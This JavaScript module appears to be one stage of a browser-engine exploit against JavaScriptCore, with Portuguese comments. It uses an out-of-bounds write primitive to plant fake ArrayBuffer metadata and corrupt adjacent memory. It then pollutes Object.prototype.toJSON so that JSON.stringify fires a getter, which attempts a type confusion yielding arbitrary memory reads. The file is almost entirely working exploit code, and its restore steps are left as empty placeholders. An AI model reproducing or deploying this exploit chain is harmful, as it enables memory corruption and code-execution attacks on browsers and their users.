// js/script3/testRetypeOOB_AB_ViaShadowCraft.mjs
import { logS3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real, // A variável global que referencia o ArrayBuffer principal
    oob_dataview_real,     // A DataView sobre o oob_array_buffer_real
    oob_write_absolute,
    oob_read_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

const GETTER_CHECKPOINT_PROPERTY_NAME = "AAAA_GetterForRetypeCheck";
let getter_called_flag = false; // Renomeado para clareza, escopo do módulo
let current_test_results = { success: false, message: "Teste não iniciado.", error: null }; // Resultados globais

const ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA = new AdvancedInt64(0x1, 0x0);
const TAMANHO_ESPERADO_SOMBRA = new AdvancedInt64(0x1000, 0x0); // 4096


class CheckpointObjectForExploit { // Nome genérico
    constructor(id) {
        this.id = `ExploitCheckpoint-${id}`;
    }
}

export function toJSON_TriggerExploitGetter() { // Nome genérico
    const FNAME_toJSON = "toJSON_TriggerExploitGetter";
    if (this instanceof CheckpointObjectForExploit) {
        logS3(`toJSON: 'this' é Checkpoint. Acessando getter '${GETTER_CHECKPOINT_PROPERTY_NAME}'...`, "info", FNAME_toJSON);
        try {
            // eslint-disable-next-line no-unused-vars
            const val = this[GETTER_CHECKPOINT_PROPERTY_NAME];
        } catch (e) {
            logS3(`toJSON: Erro ao acessar getter: ${e.message}`, "error", FNAME_toJSON);
        }
    }
    return this.id;
}

// A função exportada mantém o nome para compatibilidade
export async function executeRetypeOOB_AB_Test() {
    const FNAME_TEST = "executeShadowCraftExploitTest"; // Nome interno do teste
    logS3(`--- Iniciando Teste ShadowCraft com Uint32Array ---`, "test", FNAME_TEST);

    getter_called_flag = false;
    current_test_results = { success: false, message: "Teste não executado ou getter não chamado.", error: null };

    // Validações de config...
    if (!JSC_OFFSETS.ArrayBufferContents || !JSC_OFFSETS.ArrayBuffer?.KnownStructureIDs?.ArrayBuffer_STRUCTURE_ID) {
        logS3("Offsets críticos não definidos. Abortando.", "critical", FNAME_TEST);
        current_test_results.message = "Offsets críticos não definidos.";
        return;
    }

    let toJSONPollutionApplied = false;
    let getterPollutionApplied = false;
    let originalToJSONProtoDesc = null;
    let originalGetterDesc = null;
    const ppKey_val = 'toJSON';

    try {
        await triggerOOB_primitive();
        if (!oob_array_buffer_real || !oob_dataview_real) {
            current_test_results = { success: false, message: "Falha ao inicializar OOB.", error: "OOB env not set" };
            logS3(current_test_results.message, "critical", FNAME_TEST);
            return;
        }
        logS3(`Ambiente OOB inicializado. oob_ab_len: ${oob_array_buffer_real.byteLength}`, "info", FNAME_TEST);

        // 1. Plantar "Metadados Sombra" de ArrayBufferContents no início do buffer de dados do oob_array_buffer_real
        const shadow_metadata_offset_in_oob_data = 0x0;
        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.SIZE_IN_BYTES_OFFSET_FROM_CONTENTS_START, TAMANHO_ESPERADO_SOMBRA, 8);
        oob_write_absolute(shadow_metadata_offset_in_oob_data + JSC_OFFSETS.ArrayBufferContents.DATA_POINTER_OFFSET_FROM_CONTENTS_START, ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA, 8);
        logS3(`Metadados sombra plantados: ptr=${ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA.toString(true)}, size=${TAMANHO_ESPERADO_SOMBRA.toString(true)}`, "info", FNAME_TEST);

        // 2. Realizar a escrita OOB "gatilho"
        const corruption_trigger_offset_abs = (OOB_CONFIG.BASE_OFFSET_IN_DV || 128) - 16; // 0x70
        const corruption_value = new AdvancedInt64(0xFFFFFFFF, 0xFFFFFFFF);
        oob_write_absolute(corruption_trigger_offset_abs, corruption_value, 8);
        logS3(`Escrita OOB gatilho em ${toHex(corruption_trigger_offset_abs)} completada.`, "info", FNAME_TEST);

        // 3. Configurar o getter e poluir
        const checkpoint_obj = new CheckpointObjectForExploit(1);
        originalGetterDesc = Object.getOwnPropertyDescriptor(CheckpointObjectForExploit.prototype, GETTER_CHECKPOINT_PROPERTY_NAME);

        Object.defineProperty(CheckpointObjectForExploit.prototype, GETTER_CHECKPOINT_PROPERTY_NAME, {
            get: function() {
                getter_called_flag = true;
                const FNAME_GETTER = "ExploitTestGetter";
                logS3(`Getter "${GETTER_CHECKPOINT_PROPERTY_NAME}" FOI CHAMADO!`, "vuln", FNAME_GETTER);
                current_test_results = { success: false, message: "Getter chamado, teste de Uint32Array em andamento.", error: null };

                try {
                    logS3(`DENTRO DO GETTER: Tentando 'new Uint32Array(oob_array_buffer_real)'...`, "info", FNAME_GETTER);
                    // Tenta criar um Uint32Array diretamente sobre o oob_array_buffer_real.
                    // Se o oob_array_buffer_real (o objeto JS) foi confundido para ser um ponteiro para
                    // os metadados sombra (que têm data_ptr=0x1, size=0x1000), esta operação
                    // poderia tentar criar um Uint32Array sobre a memória em 0x1 com tamanho 0x1000.
                    let confused_typed_array = new Uint32Array(oob_array_buffer_real);

                    // Se chegou aqui, o construtor do Uint32Array aceitou oob_array_buffer_real.
                    // Isso geralmente significa que ele ainda é visto como um ArrayBuffer válido.
                    logS3(`DENTRO DO GETTER: Uint32Array criado sobre oob_ab. Length: ${confused_typed_array.length}. oob_ab.byteLength: ${oob_array_buffer_real.byteLength}`, "info", FNAME_GETTER);

                    // Se o tamanho do Uint32Array for (TAMANHO_ESPERADO_SOMBRA / 4), isso seria um SINAL FORTE.
                    if (confused_typed_array.length === (TAMANHO_ESPERADO_SOMBRA.low() / 4) ) {
                        logS3(`DENTRO DO GETTER: SUCESSO ESPECULATIVO! Comprimento do Uint32Array (${confused_typed_array.length}) corresponde ao tamanho dos metadados sombra!`, "vuln", FNAME_GETTER);
                        logS3(`DENTRO DO GETTER: Tentando ler confused_typed_array[0] (deveria ler de ${ENDERECO_INVALIDO_PARA_LEITURA_TESTE_SOMBRA.toString(true)})...`, "info", FNAME_GETTER);
                        let val = confused_typed_array[0]; // Tenta ler de 0x1
                        current_test_results = { success: true, message: `Uint32Array com tamanho de sombra. Lido de [0x1]: ${toHex(val)} SEM ERRO.`, error: null };
                        logS3(`DENTRO DO GETTER: Lido de confused_typed_array[0]: ${toHex(val)}.`, "leak", FNAME_GETTER);
                    } else {
                        // Comportamento normal: Uint32Array é criado sobre o buffer original.
                        let val_original = confused_typed_array[0];
                        logS3(`DENTRO DO GETTER: Comprimento do Uint32Array (${confused_typed_array.length}) NÃO corresponde ao tamanho sombra. Lido de offset 0 do buffer original: ${toHex(val_original)}`, "warn", FNAME_GETTER);
                        current_test_results = { success: false, message: `Uint32Array usou buffer original. Length: ${confused_typed_array.length}, Lido[0]: ${toHex(val_original)}`, error: null };
                    }

                } catch (e) {
                    logS3(`DENTRO DO GETTER: ERRO ao tentar 'new Uint32Array(oob_array_buffer_real)': ${e.message}`, "error", FNAME_GETTER);
                    // Se o erro for RangeError devido ao endereço 0x1, é um sinal de sucesso.
                    if (String(e.message).toLowerCase().includes("rangeerror") || String(e.message).toLowerCase().includes("memory access")) {
                         logS3(`DENTRO DO GETTER: O erro '${e.message}' PODE SER O CRASH CONTROLADO esperado ao tentar usar 0x1!`, "vuln", FNAME_GETTER);
                        current_test_results = { success: true, message: `Uint32Array sobre oob_ab causou CRASH CONTROLADO '${e.message}' (provavelmente devido a 0x1).`, error: String(e) };
                    } else {
                        current_test_results = { success: false, message: `Erro inesperado com Uint32Array: ${e.message}`, error: String(e) };
                    }
                }
                return 0xBADF00D;
            },
            configurable: true
        });
        getterPollutionApplied = true;

        originalToJSONProtoDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_val);
        Object.defineProperty(Object.prototype, ppKey_val, {value: toJSON_TriggerExploitGetter, writable: true, enumerable: false, configurable: true});
        toJSONPollutionApplied = true;
        logS3(`Poluições aplicadas.`, "info", FNAME_TEST);

        logS3(`Chamando JSON.stringify(checkpoint_obj)...`, "info", FNAME_TEST);
        try {
            JSON.stringify(checkpoint_obj);
        } catch (e) {
            logS3(`Erro JSON.stringify: ${e.message}`, "error", FNAME_TEST);
        }

    } catch (mainError) {
        logS3(`Erro principal: ${mainError.message}`, "critical", FNAME_TEST);
        console.error(mainError);
        current_test_results = { success: false, message: `Erro crítico: ${mainError.message}`, error: String(mainError) };
    } finally {
        // Restauração
        if (toJSONPollutionApplied && Object.prototype.hasOwnProperty(ppKey_val)) { /* ... */ }
        if (getterPollutionApplied && CheckpointObjectForExploit.prototype.hasOwnProperty(GETTER_CHECKPOINT_PROPERTY_NAME)) { /* ... */ }
        logS3("Limpeza finalizada.", "info", "CleanupFinal");
    }

    if (getter_called_flag) {
        if (current_test_results.success) {
            logS3(`RESULTADO TESTE UINT32ARRAY: ${current_test_results.message}`, "vuln", FNAME_TEST);
        } else {
            logS3(`RESULTADO TESTE UINT32ARRAY: Getter chamado, mas teste não conclusivo. ${current_test_results.message}`, "warn", FNAME_TEST);
        }
    } else {
        logS3("RESULTADO TESTE UINT32ARRAY: Getter NÃO foi chamado.", "error", FNAME_TEST);
    }
    logS3(`  Detalhes finais: ${JSON.stringify(current_test_results)}`, "info", FNAME_TEST);

    clearOOBEnvironment();
    logS3(`--- Teste ShadowCraft com Uint32Array Concluído ---`, "test", FNAME_TEST);
}
